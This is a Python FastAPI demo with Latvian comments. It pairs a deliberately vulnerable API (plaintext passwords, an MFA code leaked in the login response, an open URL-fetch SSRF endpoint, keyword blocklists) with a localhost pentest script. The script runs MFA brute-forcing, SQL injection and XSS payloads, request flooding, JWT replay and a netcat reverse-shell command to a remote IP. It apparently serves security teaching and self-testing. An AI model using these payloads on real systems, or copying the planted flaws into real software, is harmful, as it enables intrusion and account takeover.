from fastapi import FastAPI, Depends, HTTPException, Request, Form
from fastapi.security import OAuth2PasswordBearer
from fastapi.responses import JSONResponse
from pydantic import BaseModel
import jwt
import sqlite3
import logging
import os
import random
from datetime import datetime, timedelta
import hashlib
import time
import requests

# --- KONFIGURĀCIJA ---
SECRET_KEY = os.urandom(32)
ALGORITHM = "HS256"

app = FastAPI()

logging.basicConfig(
    filename="security.log",
    level=logging.INFO,
    format="%(asctime)s - %(levelname)s - %(message)s"
)

def log_attack(attack_type, message):
    with open("attack_logs.txt", "a") as f:
        f.write(f"[{datetime.now()}] [{attack_type}] {message}\n")

conn = sqlite3.connect(":memory:", check_same_thread=False)
cursor = conn.cursor()
cursor.execute("CREATE TABLE users (id INTEGER PRIMARY KEY, username TEXT, password TEXT, role TEXT, mfa_code TEXT)")
cursor.execute("INSERT INTO users (username, password, role) VALUES (?, ?, ?)", ("admin", "adminpassword", "admin"))
cursor.execute("INSERT INTO users (username, password, role) VALUES (?, ?, ?)", ("user", "userpassword", "user"))
conn.commit()

oauth2_scheme = OAuth2PasswordBearer(tokenUrl="token")

failed_attempts = {}

def generate_mfa_code():
    return str(random.randint(100000, 999999))

@app.post("/token")
async def login(username: str = Form(...), password: str = Form(...), request: Request = None):
    ip = request.client.host
    if failed_attempts.get(ip, 0) > 5:
        logging.warning(f"Brute-force aizdomas no IP: {ip}")
        raise HTTPException(status_code=429, detail="Pārāk daudz pieprasījumu, lūdzu, mēģiniet vēlāk.")

    cursor.execute("SELECT * FROM users WHERE username=?", (username,))
    user = cursor.fetchone()

    if not user or user[2] != password:
        failed_attempts[ip] = failed_attempts.get(ip, 0) + 1
        logging.warning(f"Neveiksmīgs mēģinājums: {username} no {ip}")
        raise HTTPException(status_code=401, detail="Nepareizs lietotājvārds vai parole")

    # Ģenerē un saglabā MFA kodu
    mfa_code = generate_mfa_code()
    cursor.execute("UPDATE users SET mfa_code=? WHERE username=?", (mfa_code, username))
    conn.commit()

    logging.info(f"MFA kods ģenerēts lietotājam {username}: {mfa_code}")
    return {"message": "Ievadiet MFA kodu", "mfa_code": mfa_code}

@app.post("/mfa")
async def verify_mfa(username: str = Form(...), mfa_code: str = Form(...)):
    cursor.execute("SELECT * FROM users WHERE username=?", (username,))
    user = cursor.fetchone()

    if not user or user[4] != mfa_code:
        logging.warning(f"MFA kods nesakrīt lietotājam {username}")
        raise HTTPException(status_code=401, detail="Nepareizs MFA kods")

    access_token = jwt.encode(
        {"sub": username, "exp": datetime.utcnow() + timedelta(minutes=15)},
        SECRET_KEY,
        algorithm=ALGORITHM
    )
    return {"access_token": access_token, "token_type": "bearer"}

# Funkcija, lai iegūtu pašreizējo lietotāju, nodrošinot RBAC
def get_current_user(token: str = Depends(oauth2_scheme)):
    try:
        payload = jwt.decode(token, SECRET_KEY, algorithms=[ALGORITHM])
        username = payload.get("sub")
        cursor.execute("SELECT * FROM users WHERE username=?", (username,))
        user = cursor.fetchone()
        if not user:
            raise HTTPException(status_code=404, detail="Lietotājs nav atrasts")
        return {"username": user[1], "role": user[3]}
    except jwt.ExpiredSignatureError:
        raise HTTPException(status_code=401, detail="Token beidzies")
    except jwt.JWTError:
        raise HTTPException(status_code=401, detail="Nederīgs token")

@app.get("/secure-data")
async def get_secure_data(token: str = Depends(oauth2_scheme)):
    try:
        jwt.decode(token, SECRET_KEY, algorithms=[ALGORITHM])
        return {"message": "Jūs esat autentificēts!"}
    except jwt.ExpiredSignatureError:
        raise HTTPException(status_code=401, detail="Token beidzies")
    except jwt.JWTError:
        raise HTTPException(status_code=401, detail="Nederīgs token")

@app.get("/admin-area")
async def admin_area(user: dict = Depends(get_current_user)):
    if user["role"] != "admin":
        raise HTTPException(status_code=403, detail="Nav piekļuves")
    return {"message": f"Sveiks, {user['username']}! Tu esi admin."}

@app.post("/command")
async def run_command(payload: dict, user: dict = Depends(get_current_user)):
    command = payload.get("command", "")
    if any(x in command for x in [";", "&&", "|", "`"]):
        logging.warning(f"RCE mēģinājums no {user['username']}: {command}")
        raise HTTPException(status_code=400, detail="Aizdomīga komanda")
    return {"result": f"Komanda '{command}' netika izpildīta (simulācija)"}

@app.get("/admin-secret")
async def honeypot(request: Request):
    ip = request.client.host
    log_attack("HONEYPOT", f"Honeypot pieprasījums no IP: {ip}")
    return {"error": "Nepieļaujama piekļuve"}

@app.post("/dev-debug")
async def debug_shell(payload: dict):
    logging.warning("Zero-Day pieprasījums uz /dev-debug")
    return {"msg": "Šis endpoint nav pieejams publiski"}

@app.post("/fetch-url")
async def fetch_url(payload: dict):
    url = payload.get("url")
    if not url:
        raise HTTPException(status_code=400, detail="URL nav norādīts")
    try:
        response = requests.get(url, timeout=3)
        return {"status": response.status_code, "content": response.text[:200]}
    except Exception as e:
        logging.warning(f"SSRF pieprasījuma kļūda: {str(e)}")
        raise HTTPException(status_code=400, detail="Neizdevās izgūt URL datus")

@app.middleware("http")
async def waf_simulation(request: Request, call_next):
    body = await request.body()
    try:
        decoded_body = body.decode()
    except Exception:
        decoded_body = ""
    if any(bad in decoded_body for bad in ["<script>", "SELECT", "`", "|", "nc "]):
        logging.warning(f"WAF BLOĶĒJA: {decoded_body}")
        return JSONResponse(status_code=403, content={"detail": "WAF bloķēja pieprasījumu"})
    response = await call_next(request)
    return response

def verify_integrity():
    try:
        with open(__file__, 'rb') as f:
            content = f.read()
            checksum = hashlib.sha256(content).hexdigest()
        known_hash = "tavs-iepriekš-saglabātais-checksum"
        if checksum != known_hash:
            print("Brīdinājums: API kods ticis mainīts!")
    except Exception as e:
        logging.error(f"Integritātes verifikācija neizdevās: {str(e)}")

def brute_force_mfa(username):
    for code in range(100000, 999999):
        response = requests.post("http://localhost:8000/mfa", data={"username": username, "mfa_code": str(code)})
        if response.status_code == 200:
            print(f"Uzlauzts MFA! Pareizais kods: {code}")
            return response.json()["access_token"]
    print("MFA kods netika uzlauzts.")
    return None

def test_sql_injection():
    payload = {"username": "' OR 1=1 --", "password": "password"}
    response = requests.post("http://localhost:8000/token", data=payload)
    try:
        json_resp = response.json()
    except Exception as e:
        json_resp = response.text
    print("[SQL Injection] Response:", json_resp)

def test_reverse_shell():
    payload = {"command": "nc -e /bin/sh 192.168.1.10 4444"}
    response = requests.post("http://localhost:8000/command", json=payload)
    print("[Reverse Shell] Response:", response.json())

def ddos_attack():
    for _ in range(500):
        response = requests.get("http://localhost:8000/secure-data")
        if response.status_code == 429:
            print("DDoS aizsardzība aktivizējās!")
            break
        time.sleep(0.01)

def test_xss():
    payload = {"username": "<script>alert('XSS')</script>", "password": "test"}
    response = requests.post("http://localhost:8000/token", data=payload)
    print("[XSS Test] Response:", response.text)

def steal_token():
    # Šeit simulējam tokena pārtveršanu (piemērs – noder reālajā testēšanā)
    stolen_token = "eyJhbGciOiJIUzI1NiIs..."
    headers = {"Authorization": f"Bearer {stolen_token}"}
    response = requests.get("http://localhost:8000/secure-data", headers=headers)
    print("[JWT Theft] Response:", response.json())

def test_ssrf():
    url = "http://localhost:8000/admin-area"
    response = requests.post("http://localhost:8000/fetch-url", json={"url": url})
    print("[SSRF Test] Response:", response.text)

def detect_anomalies():
    try:
        with open("attack_logs.txt", "r") as f:
            lines = f.readlines()
            ip_counter = {}
            for line in lines:
                if "IP:" in line:
                    ip = line.split("IP:")[1].strip()
                    ip_counter[ip] = ip_counter.get(ip, 0) + 1
            for ip, count in ip_counter.items():
                if count > 10:
                    print(f"AI Alert: Aizdomīga aktivitāte no {ip}")
    except Exception as e:
        print(f"Anomaliju detektēšana neizdevās: {str(e)}")

# --- GALVENĀ IZPILDĪŠANA ---
if __name__ == "__main__":
    print("Sākam pentest uzbrukumus...")
    test_sql_injection()
    token = brute_force_mfa("admin")
    test_reverse_shell()
    ddos_attack()
    test_xss()
    steal_token()
    test_ssrf()
    detect_anomalies()

